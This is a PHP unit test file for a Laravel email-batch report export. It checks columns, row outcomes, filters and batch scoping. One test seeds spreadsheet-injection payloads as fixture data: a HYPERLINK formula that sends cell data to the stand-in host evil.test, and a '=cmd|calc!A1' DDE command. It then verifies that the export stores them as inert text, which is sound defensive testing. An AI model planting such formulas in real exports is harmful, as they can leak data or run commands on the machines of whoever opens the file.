<?php

namespace Tests\Unit;

use App\Exports\BatchReportExport;
use App\Exports\SampleTemplateExport;
use App\Models\EmailBatch;
use App\Models\EmailLog;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class BatchReportExportTest extends TestCase
{
    use RefreshDatabase;

    public function test_it_exports_every_row_of_the_batch_including_invalid_ones(): void
    {
        $batch = EmailBatch::factory()->create();

        EmailLog::factory()->create([
            'batch_id' => $batch->id,
            'name'     => 'Ada',
            'email'    => 'ada@example.com',
            'status'   => EmailLog::STATUS_SENT,
            'sent_at'  => now(),
        ]);
        EmailLog::factory()->create([
            'batch_id' => $batch->id,
            'name'     => 'Bob',
            'email'    => 'bad-address',
            'status'   => EmailLog::STATUS_FAILED,
            'remarks'  => 'Invalid email syntax',
        ]);

        $rows = (new BatchReportExport($batch))->collection();

        $this->assertCount(2, $rows, 'the report must account for the whole file');
    }

    public function test_the_heading_row_names_every_report_column(): void
    {
        $batch = EmailBatch::factory()->create();

        $headings = (new BatchReportExport($batch))->headings();

        $this->assertSame(
            ['Name', 'Email', 'Status', 'Date', 'Time', 'Attempts', 'Remarks'],
            $headings,
        );
    }

    public function test_each_row_carries_its_outcome(): void
    {
        $batch = EmailBatch::factory()->create();

        EmailLog::factory()->create([
            'batch_id' => $batch->id,
            'name'     => 'Bob',
            'email'    => 'bad-address',
            'status'   => EmailLog::STATUS_FAILED,
            'attempts' => 3,
            'remarks'  => 'Invalid email syntax',
        ]);

        $row = (new BatchReportExport($batch))->collection()->first();

        $this->assertSame('Bob', $row[0]);
        $this->assertSame('bad-address', $row[1]);
        $this->assertSame('Failed', $row[2]);
        $this->assertSame(3, $row[5]);
        $this->assertSame('Invalid email syntax', $row[6]);
    }

    public function test_a_row_that_never_sent_falls_back_to_its_created_date(): void
    {
        $batch = EmailBatch::factory()->create();

        $log = EmailLog::factory()->create([
            'batch_id' => $batch->id,
            'status'   => EmailLog::STATUS_FAILED,
            'sent_at'  => null,
        ]);

        $row = (new BatchReportExport($batch))->collection()->first();

        $this->assertSame($log->created_at->format('Y-m-d'), $row[3]);
        $this->assertNotEmpty($row[4]);
    }

    public function test_a_null_remark_exports_as_an_empty_string(): void
    {
        $batch = EmailBatch::factory()->create();

        EmailLog::factory()->create([
            'batch_id' => $batch->id,
            'status'   => EmailLog::STATUS_SENT,
            'sent_at'  => now(),
            'remarks'  => null,
        ]);

        $row = (new BatchReportExport($batch))->collection()->first();

        $this->assertSame('', $row[6]);
    }

    public function test_a_status_filter_narrows_the_export(): void
    {
        $batch = EmailBatch::factory()->create();

        EmailLog::factory()->create(['batch_id' => $batch->id, 'status' => EmailLog::STATUS_SENT]);
        EmailLog::factory()->create(['batch_id' => $batch->id, 'status' => EmailLog::STATUS_FAILED]);

        $rows = (new BatchReportExport($batch, EmailLog::STATUS_FAILED))->collection();

        $this->assertCount(1, $rows);
    }

    public function test_it_exports_only_the_given_batch(): void
    {
        $mine  = EmailBatch::factory()->create();
        $other = EmailBatch::factory()->create();

        EmailLog::factory()->create(['batch_id' => $mine->id]);
        EmailLog::factory()->count(3)->create(['batch_id' => $other->id]);

        $this->assertCount(1, (new BatchReportExport($mine))->collection());
    }

    public function test_a_formula_in_recipient_data_is_not_executable_in_the_export(): void
    {
        $batch = EmailBatch::factory()->create();

        EmailLog::factory()->create([
            'batch_id' => $batch->id,
            'name'     => '=HYPERLINK("http://evil.test?x="&A1,"click")',
            'status'   => EmailLog::STATUS_FAILED,
            'remarks'  => '=cmd|calc!A1',
        ]);

        \Maatwebsite\Excel\Facades\Excel::store(new BatchReportExport($batch), 'formula-check.xlsx', 'local');
        $path = \Illuminate\Support\Facades\Storage::disk('local')->path('formula-check.xlsx');

        $sheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($path)->getActiveSheet();

        // 'f' would mean Excel executes it on open; 's' is inert text.
        $this->assertSame('s', $sheet->getCell('A2')->getDataType());
        $this->assertSame('s', $sheet->getCell('G2')->getDataType());

        @unlink($path);
    }

    public function test_the_sample_template_has_the_expected_columns_and_rows(): void
    {
        $export = new SampleTemplateExport();

        $this->assertSame(['name', 'email'], $export->headings());
        $this->assertCount(2, $export->collection());
    }
}
